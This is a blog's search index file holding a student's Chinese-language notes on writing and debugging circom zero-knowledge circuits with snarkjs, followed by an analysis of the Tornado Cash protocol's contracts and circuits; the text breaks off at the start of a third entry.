<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>circom cookbook</title>
      <link href="/2023/05/22/circom-cookbook/"/>
      <url>/2023/05/22/circom-cookbook/</url>
      
        <content type="html"><![CDATA[<h4 id="compile-circom-and-test">Compile circom and test</h4><p>circom+snarkjs测试（e.g. bn.circom）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">circom bn.circom --r1cs --wasm --sym --c</span><br><span class="line">cd bn_js</span><br><span class="line"><span class="meta">#</span><span class="bash"> create input.json <span class="keyword">in</span> bn_js</span></span><br><span class="line"></span><br><span class="line">snarkjs wc bn.wasm input.json witness.wtns</span><br><span class="line"></span><br><span class="line">snarkjs powersoftau new bn128 12 pot12_0000.ptau -v</span><br><span class="line">snarkjs powersoftau contribute pot12_0000.ptau pot12_0001.ptau --name="First contribution" -v</span><br><span class="line"></span><br><span class="line">snarkjs powersoftau prepare phase2 pot12_0001.ptau pot12_final.ptau -v</span><br><span class="line">snarkjs g16s ../bn.r1cs pot12_final.ptau bn_0000.zkey</span><br><span class="line">snarkjs zkey contribute bn_0000.zkey bn_0001.zkey --name="1st Contributor Name" -v</span><br><span class="line"></span><br><span class="line">snarkjs zkey export verificationkey bn_0001.zkey verification_key.json</span><br><span class="line"></span><br><span class="line">snarkjs g16p bn_0001.zkey witness.wtns proof.json public.json</span><br><span class="line">snarkjs g16v verification_key.json public.json proof.json</span><br></pre></td></tr></table></figure><p><a href="https://github.com/iden3/snarkjs" target="_blank" rel="noopener">https://github.com/iden3/snarkjs</a></p><h4 id="scalar-size-does-not-match">Scalar size does not match</h4><p>circom (groth16) 不允许输出门只有add operation的情况，当constraints: 0时，生成proof会报错：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ERROR] snarkJS: Error: Scalar size does not match</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2023/05/22/circom-cookbook/image-20230521204450656.png" alt="image-20230521204450656" style="zoom:50%;"></p><p>但有multiply operation时，circom编译会做处理，使得约束整合成quadratic的形式（<span class="math inline">\(A*B-C=0\)</span>），并压缩电路大小：</p><figure><img src= "/img/loading.gif" data-src="/2023/05/22/circom-cookbook/image-20230521142208277.png" alt="image-20230521142208277"><figcaption aria-hidden="true">image-20230521142208277</figcaption></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c &lt;== a + b;</span><br><span class="line">d &lt;== a * b;</span><br><span class="line"></span><br><span class="line">[-a] * [c - a] - [-d] = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>[TODO] 但对于以下约束：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r1 &lt;== a + b;</span><br><span class="line">r2 &lt;== c * d;</span><br></pre></td></tr></table></figure><p>snarkjs rp打印出来的r1cs约束直接不包含<code>r1 &lt;== a + b</code>，</p><figure><img src= "/img/loading.gif" data-src="/2023/05/22/circom-cookbook/image-20230523173213698.png" alt="image-20230523173213698"><figcaption aria-hidden="true">image-20230523173213698</figcaption></figure><p>但实际上加法约束也能拍平成R1CS，因此该问题（吞约束）待解决：</p><figure><img src= "/img/loading.gif" data-src="/2023/05/22/circom-cookbook/image-20230523172955578.png" alt="image-20230523172955578"><figcaption aria-hidden="true">image-20230523172955578</figcaption></figure><h4 id="non-quadratic-constraints-are-not-allowed">Non quadratic constraints are not allowed</h4><p>circom无法直接处理<code>%</code>，<code>&gt;&gt;</code>，<code>**</code>等约束，会报错Non quadratic constraints are not allowed</p><p><strong>test_mod.circom</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// without LessThan, constraints: 0, [ERROR] snarkJS: Error: Scalar size does not match</span></span><br><span class="line">template test_mod(wbits, b) &#123;</span><br><span class="line">    assert(wbits &lt;= <span class="number">252</span>);</span><br><span class="line">    signal input a;</span><br><span class="line">    signal output r;    <span class="comment">// a = q * b + r</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// signal q;</span></span><br><span class="line">    <span class="comment">// q &lt;-- a \ b;</span></span><br><span class="line">    r &lt;-- a % b;</span><br><span class="line"></span><br><span class="line">    component lessThan = LessThan(wbits);</span><br><span class="line">    lessThan.in[<span class="number">0</span>] &lt;== r;</span><br><span class="line">    lessThan.in[<span class="number">1</span>] &lt;== b;</span><br><span class="line">    lessThan.out === <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// a === q * b + r;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure><img src= "/img/loading.gif" data-src="/2023/05/22/circom-cookbook/image-20230522095150094.png" alt="image-20230522095150094"><figcaption aria-hidden="true">image-20230522095150094</figcaption></figure><p>需要注意的是，<code>snarkjs rp</code>打印出的R1CS约束，在常数项的<code>x*1</code>并不显示<code>*</code>，因此实际上前若干项<code>[ 218882428718392752222464057452572750885483644004160343436982041865758084956161 +main.lessThan.n2b.out[i] ] * [ main.lessThan.n2b.out[i] ] - [  ] = 0</code>表示约束<code>[ -1 +main.lessThan.n2b.out[i] ] * [ main.lessThan.n2b.out[i] ] - [  ] = 0</code></p><p><img src= "/img/loading.gif" data-src="/2023/05/22/circom-cookbook/image-20230522095332316.png" alt="image-20230522095332316" style="zoom:50%;"></p><p>在对应的bn.sym符号表中，可以看到circom简化了约束（移除部分signal）</p><p><strong>test_rsh.circom</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">template test_rsh(wbits, b) &#123;</span><br><span class="line">    assert(wbits &lt;= <span class="number">253</span>);</span><br><span class="line">    signal input a;</span><br><span class="line">    signal output r;</span><br><span class="line"></span><br><span class="line">    signal check_a;</span><br><span class="line">    component lessThan = LessThan(wbits);</span><br><span class="line"></span><br><span class="line">    r &lt;-- a &gt;&gt; b;</span><br><span class="line">    check_a &lt;== r * (<span class="number">1</span> &lt;&lt; b);</span><br><span class="line"></span><br><span class="line">    lessThan.in[<span class="number">0</span>] &lt;== a - check_a;</span><br><span class="line">    lessThan.in[<span class="number">1</span>] &lt;== (<span class="number">1</span> &lt;&lt; b); </span><br><span class="line">    lessThan.out === <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>test_dlp.circom</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">template test_dlp(a, n) &#123;</span><br><span class="line">    signal input x; <span class="comment">// n-bit</span></span><br><span class="line">    signal output y;    <span class="comment">// y = a ^ x</span></span><br><span class="line"></span><br><span class="line">    component n2b = Num2Bits(n);</span><br><span class="line">    n2b.in &lt;== a;</span><br><span class="line"></span><br><span class="line">    signal y1[n];</span><br><span class="line">    signal y2[n - <span class="number">1</span>];</span><br><span class="line">    y1[<span class="number">0</span>] &lt;== <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> tmp = n2b.out[n - i] * (a - <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        y2[i - <span class="number">1</span>] &lt;== tmp * y1[i - <span class="number">1</span>];</span><br><span class="line">        y1[i] &lt;== y2[i - <span class="number">1</span>] * y2[i - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> tmp = n2b.out[<span class="number">0</span>] * (a - <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">    y &lt;== y1[n - <span class="number">1</span>] * tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dlp的思路是调用<code>Num2Bits</code>，再基于快速幂（在每一位上做条件乘法和平方）</p><p>进一步，若<code>r = rsh(a&gt;&gt;b)</code>的<code>b</code>也作为witness，则可以通过<code>dlp</code>组件获得<code>c = 2 ^ b</code>，再创建约束<code>check_a &lt;== c * r</code>，最后调用<code>LessThan</code>组件即可</p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
          <category> Postgraduate </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Tornado Cash</title>
      <link href="/2023/05/08/Tornado-Cash/"/>
      <url>/2023/05/08/Tornado-Cash/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Ethereum上的隐私保护协议（混币+零知识证明）</p><p><a href="https://github.dev/tornadocash/tornado-core" target="_blank" rel="noopener">https://github.dev/tornadocash/tornado-core</a></p></blockquote><h3 id="protocol-description">Protocol description</h3><ul><li><p>deposit</p><ul><li><p>生成随机<em>nullifier</em> <span class="math inline">\(k\in\{0,1\}^{248}\)</span>，<em>randomness</em> <span class="math inline">\(r\in\{0,1\}^{248}\)</span>，并计算<span class="math inline">\(C=H_1(k||r)\)</span>。</p><p>其中<span class="math inline">\(H_1:\{0,1\}^{*}\rightarrow\mathbb{Z}_p\)</span>为Pedersen Hash（实际上结果是point，见circomlib下perdersen circuit的实现，但tornado.cash是取out[0]，即x坐标）</p><p><a href="https://github.com/iden3/circomlib/blob/master/circuits/pedersen.circom" target="_blank" rel="noopener">https://github.com/iden3/circomlib/blob/master/circuits/pedersen.circom</a></p><p><a href="https://blog.csdn.net/turkeycock/article/details/97569082" target="_blank" rel="noopener">https://blog.csdn.net/turkeycock/article/details/97569082</a></p></li><li><p>调用<code>deposit</code> (with a fixed amount ETH)，参数为<span class="math inline">\(C\)</span>。</p></li><li><p>若交易金额(<code>msg.value</code>)正确，且合约中的Merkle Tree未满，则将<span class="math inline">\(C\)</span>作为新叶节点插入。</p></li></ul><p>Tornado.sol</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deposit</span>(<span class="params">bytes32 _commitment</span>) <span class="title">external</span> <span class="title">payable</span> <span class="title">nonReentrant</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(!commitments[_commitment], <span class="string">"The commitment has been submitted"</span>);</span><br><span class="line">    </span><br><span class="line">    uint32 insertedIndex = _insert(_commitment);</span><br><span class="line">    commitments[_commitment] = <span class="literal">true</span>;</span><br><span class="line">    _processDeposit();</span><br><span class="line"></span><br><span class="line">    emit Deposit(_commitment, insertedIndex, block.timestamp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** <span class="doctag">@dev </span>this function is defined in a child contract */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_processDeposit</span>(<span class="params"></span>) <span class="title">internal</span> <span class="title">virtual</span>;</span></span><br></pre></td></tr></table></figure><p>ERC20Tornado.sol</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_processDeposit</span>(<span class="params"></span>) <span class="title">internal</span> <span class="title">override</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value == denomination, <span class="string">"Please send `mixDenomination` ETH along with transaction"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>withdraw</p><p><code>deposit</code>每次调用后，合约都会更新Merkle Tree的root，且会存储一定数量(<code>ROOT_HISTORY_SIZE</code>)的历史root。</p><ul><li><p>选择合约中存储的其中一个历史<em>root</em> <span class="math inline">\(R\)</span>，并计算要<code>withdraw</code>的叶节点对应的<em>Merkle opening</em> <span class="math inline">\(O\)</span>（该节点到根路径上的所有sister nodes的value以及位置（left/right））。</p></li><li><p>计算<em>nullifier hash</em> <span class="math inline">\(h=H_1(k)\)</span>。</p></li><li><p>计算零知识证明值<span class="math inline">\(P\)</span>：</p><p><span class="math inline">\(ZKPoK\{(k,r,O):h=H_1(k)\and O\ is\ the\ Merkle\ opening\ of\ H_1(k||r)\ of\ root\ R\}\)</span></p></li><li><p>调用<code>withdraw</code> ，参数为<span class="math inline">\(R,h,P\)</span>，以及提取地址等必要字段。</p></li><li><p>若<span class="math inline">\(R\)</span>在合约历史列表中，且对零知识证明作校验合法后，向提取地址转账固定金额，并将<em>nullifier hash</em>存入列表（避免双花）。</p><p>[Question] 用户在<code>withdraw</code>时，需要根据此时的历史<em>root</em>之一对应的Merkle Tree叶节点计算path，但合约<code>MerkleTreeWithHistory</code>中仅存储最新叶节点到根路径上的值。需要链下扫描所有历史<code>deposit</code>交易插入的叶节点再构建树？（除非<code>deposit</code>后马上<code>withdraw</code>，且中间无其他<code>deposit</code>提前被接受）</p><p><img src= "/img/loading.gif" data-src="/2023/05/08/Tornado-Cash/image-20230507234259204.png"></p></li></ul><p>Tornado.sol</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    bytes calldata _proof,</span></span></span><br><span class="line"><span class="function"><span class="params">    bytes32 _root,</span></span></span><br><span class="line"><span class="function"><span class="params">    bytes32 _nullifierHash,</span></span></span><br><span class="line"><span class="function"><span class="params">    address payable _recipient,</span></span></span><br><span class="line"><span class="function"><span class="params">    address payable _relayer,</span></span></span><br><span class="line"><span class="function"><span class="params">    uint256 _fee,</span></span></span><br><span class="line"><span class="function"><span class="params">    uint256 _refund</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) <span class="title">external</span> <span class="title">payable</span> <span class="title">nonReentrant</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(_fee &lt;= denomination, <span class="string">"Fee exceeds transfer value"</span>);</span><br><span class="line">    <span class="built_in">require</span>(!nullifierHashes[_nullifierHash], <span class="string">"The note has been already spent"</span>);</span><br><span class="line">    <span class="built_in">require</span>(isKnownRoot(_root), <span class="string">"Cannot find your merkle root"</span>); <span class="comment">// Make sure to use a recent one</span></span><br><span class="line">    <span class="built_in">require</span>(</span><br><span class="line">      verifier.verifyProof(</span><br><span class="line">        _proof,</span><br><span class="line">        [uint256(_root), uint256(_nullifierHash), uint256(_recipient), uint256(_relayer), _fee, _refund]</span><br><span class="line">      ),</span><br><span class="line">      <span class="string">"Invalid withdraw proof"</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    nullifierHashes[_nullifierHash] = <span class="literal">true</span>;</span><br><span class="line">    _processWithdraw(_recipient, _relayer, _fee, _refund);</span><br><span class="line">    emit Withdrawal(_recipient, _nullifierHash, _relayer, _fee);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** <span class="doctag">@dev </span>this function is defined in a child contract */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_processWithdraw</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    address payable _recipient,</span></span></span><br><span class="line"><span class="function"><span class="params">    address payable _relayer,</span></span></span><br><span class="line"><span class="function"><span class="params">    uint256 _fee,</span></span></span><br><span class="line"><span class="function"><span class="params">    uint256 _refund</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) <span class="title">internal</span> <span class="title">virtual</span>;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="circuits-detail">Circuits detail</h3><ul><li><p>merkleTree.circom</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">include <span class="string">"../node_modules/circomlib/circuits/mimcsponge.circom"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Computes MiMC([left, right])</span></span><br><span class="line">template HashLeftRight() &#123;</span><br><span class="line">    signal input left;</span><br><span class="line">    signal input right;</span><br><span class="line">    signal output hash;</span><br><span class="line"></span><br><span class="line">    component hasher = MiMCSponge(<span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    hasher.ins[<span class="number">0</span>] &lt;== left;</span><br><span class="line">    hasher.ins[<span class="number">1</span>] &lt;== right;</span><br><span class="line">    hasher.k &lt;== <span class="number">0</span>;</span><br><span class="line">    hash &lt;== hasher.outs[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if s == 0 returns [in[0], in[1]]</span></span><br><span class="line"><span class="comment">// if s == 1 returns [in[1], in[0]]</span></span><br><span class="line">template DualMux() &#123;</span><br><span class="line">    signal input <span class="keyword">in</span>[<span class="number">2</span>];</span><br><span class="line">    signal input s;</span><br><span class="line">    signal output out[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    s * (<span class="number">1</span> - s) === <span class="number">0</span></span><br><span class="line">    out[<span class="number">0</span>] &lt;== (<span class="keyword">in</span>[<span class="number">1</span>] - <span class="keyword">in</span>[<span class="number">0</span>])*s + <span class="keyword">in</span>[<span class="number">0</span>];</span><br><span class="line">    out[<span class="number">1</span>] &lt;== (<span class="keyword">in</span>[<span class="number">0</span>] - <span class="keyword">in</span>[<span class="number">1</span>])*s + <span class="keyword">in</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Verifies that merkle proof is correct for given merkle root and a leaf</span></span><br><span class="line"><span class="comment">// pathIndices input is an array of 0/1 selectors telling whether given pathElement is on the left or right side of merkle path</span></span><br><span class="line">template MerkleTreeChecker(levels) &#123;</span><br><span class="line">    signal input leaf;</span><br><span class="line">    signal input root;</span><br><span class="line">    signal input pathElements[levels];</span><br><span class="line">    signal input pathIndices[levels];</span><br><span class="line"></span><br><span class="line">    component selectors[levels];</span><br><span class="line">    component hashers[levels];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; levels; i++) &#123;</span><br><span class="line">        selectors[i] = DualMux();</span><br><span class="line">        selectors[i].in[<span class="number">0</span>] &lt;== i == <span class="number">0</span> ? leaf : hashers[i - <span class="number">1</span>].hash;</span><br><span class="line">        selectors[i].in[<span class="number">1</span>] &lt;== pathElements[i];</span><br><span class="line">        selectors[i].s &lt;== pathIndices[i];</span><br><span class="line"></span><br><span class="line">        hashers[i] = HashLeftRight();</span><br><span class="line">        hashers[i].left &lt;== selectors[i].out[<span class="number">0</span>];</span><br><span class="line">        hashers[i].right &lt;== selectors[i].out[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    root === hashers[levels - <span class="number">1</span>].hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MiMC是snark-friendly hash function（<a href="https://blog.csdn.net/mutourend/article/details/118157053" target="_blank" rel="noopener">https://blog.csdn.net/mutourend/article/details/118157053</a>）</p></li><li><p>withdraw.circom</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">include <span class="string">"../node_modules/circomlib/circuits/bitify.circom"</span>;</span><br><span class="line">include <span class="string">"../node_modules/circomlib/circuits/pedersen.circom"</span>;</span><br><span class="line">include <span class="string">"merkleTree.circom"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// computes Pedersen(nullifier + secret)</span></span><br><span class="line">template CommitmentHasher() &#123;</span><br><span class="line">    signal input nullifier;</span><br><span class="line">    signal input secret;</span><br><span class="line">    signal output commitment;</span><br><span class="line">    signal output nullifierHash;</span><br><span class="line"></span><br><span class="line">    component commitmentHasher = Pedersen(<span class="number">496</span>);</span><br><span class="line">    component nullifierHasher = Pedersen(<span class="number">248</span>);</span><br><span class="line">    component nullifierBits = Num2Bits(<span class="number">248</span>);</span><br><span class="line">    component secretBits = Num2Bits(<span class="number">248</span>);</span><br><span class="line">    nullifierBits.in &lt;== nullifier;</span><br><span class="line">    secretBits.in &lt;== secret;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">248</span>; i++) &#123;</span><br><span class="line">        nullifierHasher.in[i] &lt;== nullifierBits.out[i];</span><br><span class="line">        commitmentHasher.in[i] &lt;== nullifierBits.out[i];</span><br><span class="line">        commitmentHasher.in[i + <span class="number">248</span>] &lt;== secretBits.out[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    commitment &lt;== commitmentHasher.out[<span class="number">0</span>];</span><br><span class="line">    nullifierHash &lt;== nullifierHasher.out[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Verifies that commitment that corresponds to given secret and nullifier is included in the merkle tree of deposits</span></span><br><span class="line">template Withdraw(levels) &#123;</span><br><span class="line">    signal input root;</span><br><span class="line">    signal input nullifierHash;</span><br><span class="line">    signal input recipient; <span class="comment">// not taking part in any computations</span></span><br><span class="line">    signal input relayer;  <span class="comment">// not taking part in any computations</span></span><br><span class="line">    signal input fee;      <span class="comment">// not taking part in any computations</span></span><br><span class="line">    signal input refund;   <span class="comment">// not taking part in any computations</span></span><br><span class="line">    signal private input nullifier;</span><br><span class="line">    signal private input secret;</span><br><span class="line">    signal private input pathElements[levels];</span><br><span class="line">    signal private input pathIndices[levels];</span><br><span class="line"></span><br><span class="line">    component hasher = CommitmentHasher();</span><br><span class="line">    hasher.nullifier &lt;== nullifier;</span><br><span class="line">    hasher.secret &lt;== secret;</span><br><span class="line">    hasher.nullifierHash === nullifierHash;</span><br><span class="line"></span><br><span class="line">    component tree = MerkleTreeChecker(levels);</span><br><span class="line">    tree.leaf &lt;== hasher.commitment;</span><br><span class="line">    tree.root &lt;== root;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; levels; i++) &#123;</span><br><span class="line">        tree.pathElements[i] &lt;== pathElements[i];</span><br><span class="line">        tree.pathIndices[i] &lt;== pathIndices[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add hidden signals to make sure that tampering with recipient or fee will invalidate the snark proof</span></span><br><span class="line">    <span class="comment">// Most likely it is not required, but it's better to stay on the safe side and it only takes 2 constraints</span></span><br><span class="line">    <span class="comment">// Squares are used to prevent optimizer from removing those constraints</span></span><br><span class="line">    signal recipientSquare;</span><br><span class="line">    signal feeSquare;</span><br><span class="line">    signal relayerSquare;</span><br><span class="line">    signal refundSquare;</span><br><span class="line">    recipientSquare &lt;== recipient * recipient;</span><br><span class="line">    feeSquare &lt;== fee * fee;</span><br><span class="line">    relayerSquare &lt;== relayer * relayer;</span><br><span class="line">    refundSquare &lt;== refund * refund;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">component main = Withdraw(<span class="number">20</span>);</span><br></pre></td></tr></table></figure></li></ul><h3 id="about-circom">About circom</h3><p><img src= "/img/loading.gif" data-src="/2023/05/08/Tornado-Cash/image-20230508111628867.png"></p><p>定义在<code>Baby Jubjub</code>曲线上，适用于Pedersen Hash等底层的计算</p><p>如果需要换其他曲线（相应安全参数也随之变化），则可能需要进行<code>GLOBAL_FIELD_P</code>的替换</p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
          <category> Postgraduate </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Some tricks about zk (1)</title>
      <link href="/2023/03/21/Some-tricks-about-zk-1/"/>
      <url>/2023/03/21/Some-tricks-about-zk-1/</url>
      
